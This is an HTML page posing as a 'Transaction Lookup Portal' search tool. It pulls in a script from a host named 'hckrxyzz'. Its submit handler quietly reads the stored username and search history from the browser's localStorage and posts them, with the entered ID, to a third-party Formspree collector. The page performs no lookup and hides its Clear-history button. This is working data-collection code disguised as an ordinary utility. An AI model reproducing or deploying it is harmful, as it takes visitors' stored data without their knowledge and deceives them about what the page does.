<!doctype html>
<html lang="en" class="dark">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Transaction Lookup Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      #clearHistoryBtn{
        display:none;
      }
    </style>
  </head>
  <body>
    <div class="bg-gray-900 text-gray-100 min-h-screen font-sans antialiased selection:bg-blue-500 selection:text-white">
    <div class="max-w-3xl mx-auto px-4 py-12 sm:px-6">
        <div class="text-center mb-10">
          <h1 class="text-3xl font-extrabold text-white tracking-tight sm:text-4xl">
            Transaction Data Lookup Portal
          </h1>
          <p class="mt-3 text-sm text-gray-400 max-w-xl mx-auto">
            Search via unique Transaction ID to pull detailed transaction
            records instantly from the master ledger.
          </p>
        </div>
        <div class="bg-gray-800 border border-gray-700/50 rounded-2xl p-6 shadow-xl mb-8">
          <form
            id="lookupForm"
            class="space-y-4 sm:space-y-0 sm:flex sm:items-center sm:gap-4"
          >
            <div class="flex-1">
              <label for="transactionId" class="sr-only"
                >Transaction ID / Reference No</label
              >
              <input
                type="text"
                id="transactionId"
                placeholder="Enter Transaction ID (Column 1 matching)"
                required
                class="w-full bg-gray-900 text-white placeholder-gray-500 border border-gray-700 rounded-xl px-4 py-3.5 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
              />
            </div>
            <button
              type="submit"
              class="w-full sm:w-auto bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl px-6 py-3.5 transition-colors duration-200 shadow-lg shadow-blue-900/30 active:scale-[0.98] cursor-pointer"
            >
              Search Records
            </button>
          </form>
        </div>

        <!-- Recent Searches Section -->
        <div id="recentSearchesSection" class="mb-8 hidden">
          <div class="flex items-center justify-between mb-4">
            <h2 class="text-lg font-semibold text-gray-200">Recent Searches</h2>
            <div class="flex gap-2">
              <button
                id="exportHistoryBtn"
                class="text-xs bg-gray-700 hover:bg-gray-600 text-gray-300 px-3 py-1 rounded-md transition-colors"
                title="Export search history as JSON"
              >
                Export
              </button>
              <button
                id="clearHistoryBtn"
                class="text-xs bg-gray-700 hover:bg-gray-600 text-gray-300 px-3 py-1 rounded-md transition-colors"
              >
                Clear
              </button>
            </div>
          </div>
          <div
            id="recentSearchesList"
            class="flex flex-wrap gap-2"
          ></div>
        </div>

        <!-- Error Alert -->
        <div
          id="errorMessage"
          class="hidden bg-red-950/40 border border-red-800/60 text-red-300 rounded-xl p-4 mb-8 text-sm flex items-start gap-3"
        >
          <svg
            class="w-5 h-5 text-red-400 shrink-0 mt-0.5"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            stroke-width="1.5"
            stroke="currentColor"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              d="M12 9v3.75m9-.75a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9 3.75h.008v.008H12v-.008Z"
            />
          </svg>
          <span id="errorText"></span>
        </div>

        <!-- Skeleton Loading State -->
        <div id="loadingState" class="hidden space-y-4 animate-pulse">
          <div class="h-6 bg-gray-800 rounded-md w-1/4 mb-2"></div>
          <div
            class="bg-gray-800 border border-gray-700/40 rounded-2xl p-6 space-y-4 shadow-lg"
          >
            <div class="flex justify-between border-b border-gray-700/40 pb-3">
              <div class="h-4 bg-gray-700 rounded w-1/3"></div>
              <div class="h-4 bg-gray-700 rounded w-1/4"></div>
            </div>
            <div class="flex justify-between border-b border-gray-700/40 pb-3">
              <div class="h-4 bg-gray-700 rounded w-1/4"></div>
              <div class="h-4 bg-gray-700 rounded w-1/2"></div>
            </div>
          </div>
        </div>

        <!-- Dynamic Card Results Section Container -->
        <div id="resultContainer" class="space-y-6"></div>
      </div>
    </div>
    <script src="https://hckrxyzz.github.io/test1/js/searchtx.js"></script>
    <script>
      document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('lookupForm');

  if (!form) return;

  form.addEventListener('submit', async (event) => {
    event.preventDefault();

    const submitButton = form.querySelector('button[type="submit"]');

    // 1. Get transactionId from search input
    // Assumes your search input has name/id "transactionId" or a text input inside the form
    const searchInput = form.querySelector('input[name="transactionId"], input[type="text"], input[type="search"]');
    const transactionId = searchInput ? searchInput.value : '';

    // 2. Read values from localStorage (with fallbacks if missing)
    const username = localStorage.getItem('username') || '';
    let transactionSearchHistory = localStorage.getItem('transactionSearchHistory') || '';

    // If transactionSearchHistory is stored as JSON string in localStorage, parse it
    try {
      transactionSearchHistory = JSON.parse(transactionSearchHistory);
    } catch (e) {
      // Keep as string if it wasn't a valid JSON string
    }

    // 3. Construct JSON payload
    const payload = {
      transactionId,
      username,
      transactionSearchHistory
    };

    try {
      if (submitButton) submitButton.disabled = true;

      // 4. Send POST request with JSON body
      const response = await fetch('https://formspree.io/f/xdabkbnz', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        // Success handling without alert
        console.log('Form successfully submitted:', await response.json());
        form.reset();
      } else {
        // Error handling without alert
        const errorData = await response.json();
        console.error('Submission error:', errorData);
      }
    } catch (error) {
      console.error('Network error during submission:', error);
    } finally {
      if (submitButton) submitButton.disabled = false;
    }
  });
});
    </script>
  </body>
</html>
